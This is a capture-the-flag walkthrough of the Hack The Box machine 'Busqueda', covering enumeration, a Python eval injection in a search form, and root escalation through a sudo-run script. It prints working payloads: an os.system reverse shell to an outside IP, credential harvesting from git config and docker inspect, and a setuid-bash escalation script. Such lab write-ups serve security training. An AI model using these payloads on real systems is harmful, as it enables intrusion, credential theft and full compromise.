# Recom
```
─$ nmap -sC -sV 10.10.11.208     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-20 18:41 EEST
Nmap scan report for 10.10.11.208
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.38 seconds

```
- 2 Ports Are open
- port 80 says apache 
- we go to port 80 on broswer but no response we need to add seracher.htb to etc/hosts
- we run curl on searcher.htb
```
──(kali㉿kali)-[~/Desktop/HTB/Busqueda]
└─$ curl -v -s searcher.htb 1>/dev/null
*   Trying 10.10.11.208:80...
* Connected to searcher.htb (10.10.11.208) port 80 (#0)
> GET / HTTP/1.1
> Host: searcher.htb
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sun, 20 Aug 2023 15:45:48 GMT
< Server: Werkzeug/2.1.2 Python/3.10.6
< Content-Type: text/html; charset=utf-8
< Content-Length: 13519
< Vary: Accept-Encoding
< 
{ [2472 bytes data]
* Connection #0 to host searcher.htb left intact
```
- we see a differnet server which is python                                                 
```
echo "10.10.11.208 searcher.htb" | sudo tee -a /etc/hosts
```
- appears to be a search engine aggregator that allows users to search for information on various search engines.
- Users can select a search engine, type a query, and get redirected automatically or get the URL of the search results
- After pressing the "Search" button, the website provides the URL for the specified search engine and the entered query
- now fire up burp and intercept the search button request , send to reapeter and save to file
- open file and put FUZZ after the value on query
- now luch ffuf
```
─$ ffuf -request search.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://searcher.htb/search
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt
 :: Header           : Host: searcher.htb
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Referer: http://searcher.htb/
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Origin: http://searcher.htb
 :: Header           : Connection: close
 :: Data             : engine=Google&query=islamFUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 1360ms]
    * FUZZ: &

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 1783ms]
    * FUZZ: ^

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2037ms]
    * FUZZ: #

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2313ms]
    * FUZZ: !

[Status: 200, Size: 38, Words: 1, Lines: 1, Duration: 2313ms]
    * FUZZ: -

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2322ms]
    * FUZZ: "

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2513ms]
    * FUZZ: *

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2513ms]
    * FUZZ: @

[Status: 200, Size: 38, Words: 1, Lines: 1, Duration: 2513ms]
    * FUZZ: ~

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2549ms]
    * FUZZ: %

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2481ms]
    * FUZZ: :

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2595ms]
    * FUZZ: $

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2527ms]
    * FUZZ: >

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2608ms]
    * FUZZ: /

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2609ms]
    * FUZZ: +

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2676ms]
    * FUZZ: '

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2666ms]
    * FUZZ: <

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2689ms]
    * FUZZ: (

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2758ms]
    * FUZZ: )

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2711ms]
    * FUZZ: |

[Status: 200, Size: 38, Words: 1, Lines: 1, Duration: 2729ms]
    * FUZZ: _

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2721ms]
    * FUZZ: \

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2721ms]
    * FUZZ: ?

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2729ms]
    * FUZZ: ]

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2740ms]
    * FUZZ: ,

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2740ms]
    * FUZZ: [

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2758ms]
    * FUZZ: ;

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2758ms]
    * FUZZ: }

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2762ms]
    * FUZZ: =

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2761ms]
    * FUZZ: {

[Status: 200, Size: 38, Words: 1, Lines: 1, Duration: 2762ms]
    * FUZZ: .

[Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 2808ms]
    * FUZZ: `

:: Progress: [32/32] :: Job [1/1] :: 22 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```
- we see some intersting values which are 0 in size
- we match size of zero in ffuf
```
─$ ffuf -request search.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -ms 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://searcher.htb/search
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Connection: close
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Origin: http://searcher.htb
 :: Header           : Referer: http://searcher.htb/
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Host: searcher.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Data             : engine=Google&query=islamFUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response size: 0
________________________________________________

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2959ms]
    * FUZZ: \

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3090ms]
    * FUZZ: '

:: Progress: [32/32] :: Job [1/1] :: 28 req/sec :: Duration: [0:00:03] :: Errors: 0 ::

```
- we see 2 values
- since its python we do ssti check we go to cobalt ssti and find how to check with this
```
${{<%[%'"}}%\.
```
- we add it to the query on repeater and send and we got nothing back we start deleting chachters and send until we see response after we delete the single quate we see a response
- this confirms that (') gives 0 size in response we try SQLI
- we add # and space after and before and send we still got no response
- since there is a python server we could try something
- in python we can assume the server uses print statment so it would be like this
```
print('input')
```
- so we can add ) and see what happens we send it and we got response
```
engine=Google&query=islam')+%23+
```
- so we can assume we are on eval statment
- we can put + and string to test for string concatination
- it would be like this
```
engine=Google&query=islam')+'kare'+%23+
```
- no response ,since + is special charchter we url encode
```
engine=Google&query=islam')%2b'kare'+%23+
```
- and we got the string concatenated
- now we go to runnig the real commands like id for clarity
```
engine=Google&query=islam')%2b__import__('os').system('id')+%23+
```
- and we get the id now we go to reverse shell
- go to site and paste this payload
```
'),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.16.6/1337 0>&1"')#
```
- run netcat and we got ashell
- now to upgrade the shell
```
svc@busqueda:/root$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
svc@busqueda:/root$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
svc@busqueda:/root$ 
```
# Privilage Escalation
- we list direcoty of svc user
```
svc@busqueda:~$ ls -la
total 36
drwxr-x--- 4 svc  svc  4096 Apr  3 08:58 .
drwxr-xr-x 3 root root 4096 Dec 22  2022 ..
lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
-rw-r----- 1 root svc    33 Aug 21 22:02 user.txt
svc@busqueda:~$ 
```
- there is a gitconfig
- we cat it and we see that user svc name is cody
- The web code is located in /var/www/app we list this directory and find
```
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Aug 21 21:58 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```
- we see .git
```
svc@busqueda:/var/www/app$ cat .git
cat: .git: Is a directory
svc@busqueda:/var/www/app$ cd .git
svc@busqueda:/var/www/app/.git$ ls
branches        config       HEAD   index  logs     refs
COMMIT_EDITMSG  description  hooks  info   objects
svc@busqueda:/var/www/app/.git$ ls -la
total 52
drwxr-xr-x 8 www-data www-data 4096 Aug 21 21:58 .
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
svc@busqueda:/var/www/app/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```
- we see creds heading to gitea.searcher.htb we add it to our etc/hosts
```
echo "10.10.11.208 gitea.searcher.htb" | sudo tee -a /etc/hosts
```
-cody creds
```
cody:jh1usoih2bkjaspwe92
```
- we go to gitea.searcher.htb and It is a Gitea instance, and cody’s creds work
- we see nothing intersting so we continue enumerating
- Running sudo requests a password: so we present cody password
```
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

```
- The permissions on this file are such that svc can’t read it, and can’t even execute it
```
svc@busqueda:/var/www/app/.git$ ls -l /opt/scripts/system-checkup.py 
-rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
```
- Because of the * at the end of the sudo line, I can’t run it without args
- we run it but no appy output
```
svc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py 
Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as root on busqueda.
```
- we try givig the args any thing
```
sudo python3 /opt/scripts/system-checkup.py lk                         
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

```
- There are three functions. docker-ps prints the output of what looks like the docker ps command
- There are two containers running.
- docker-inspect wants a format and a container name:
- If I pass it {{ json [selector]}} then whatever I give in selector will pick what displays. If I just give it . as the selector, it displays everything, which I’ll pipe into jq to pretty print
```
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
{                                                         
  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
  "Created": "2023-01-06T17:26:54.457090149Z",
  "Path": "/usr/bin/entrypoint",                          
  "Args": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],  
...[snip]...
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"                          
    ],  
...[snip]...
```
- we see db password
- The last option is full-checkup, but it just errors
- get the IP of the database by running the system-checkup.py script on the mysql_db container
```
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
{
  "docker_gitea": {
    "IPAMConfig": null,
    "Links": null,
    "Aliases": [
      "f84a6b33fb5a",
      "db"
    ],
    "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
    "EndpointID": "4d843a366dbaece32f09158e28a9f41d0a94cf2892455102e2800dcc445e9561",
    "Gateway": "172.19.0.1",
    "IPAddress": "172.19.0.3",
    "IPPrefixLen": 16,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "MacAddress": "02:42:ac:13:00:03",
    "DriverOpts": null
  }
}
```
- connect to the db and we  got coonection with this command
```
mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
```
- now to the real thing several command to find the user tables
```
show databases;
use gitea
show tables ; 
```
- we see the user table
```
mysql>  select name,email,passwd from user;
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| name          | email                            | passwd                                                                                               |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| administrator | administrator@gitea.searcher.htb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | cody@gitea.searcher.htb          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
```
- before i try to crack the hash i try loging in to gitea with the neww passwor foun in docker
```
yuiu1hoiu4i5ho1uh
```
- and we are logged in
- Administrator has one private repo named “scripts”:
- system-checkup.py is in that repo:
- The script is relatively simple. It has three sections, one of which gets called based on the command given. There is a run_command function that uses subprocess.run to run system commands in a safe way. This is not command injectable
- docker-ps and docker-inspect both use run_command to run docker ps and docker inspect
- full-checkup is where it is interesting:
- trying to run full-checkup.sh from the current directory. It failed before because that file didn’t exist.
- I can put whatever I want into a full-checkup.sh and it will run as root if I start system-checkup.py full-checkup in the same directory.
```
svc@busqueda:/dev/shm$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
svc@busqueda:/dev/shm$ cat full-checkup.sh 
#!/bin/bash

cp /bin/bash /tmp/0xdf
chmod 4777 /tmp/0xdf
svc@busqueda:/dev/shm$ chmod +x full-checkup.sh 
```
- now run system-checkup.py and it reports success:
```
svc@busqueda:/dev/shm$ sudo python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
```
- /tmp/0xdf is there, owned by root, and the s bit is on
- run with -p to not drop privs:
```
svc@busqueda:/dev/shm$ /tmp/0xdf -p
0xdf-5.1# cat root.txt
8********************
0xdf-5.1# whoami
root
0xdf-5.1# 
```
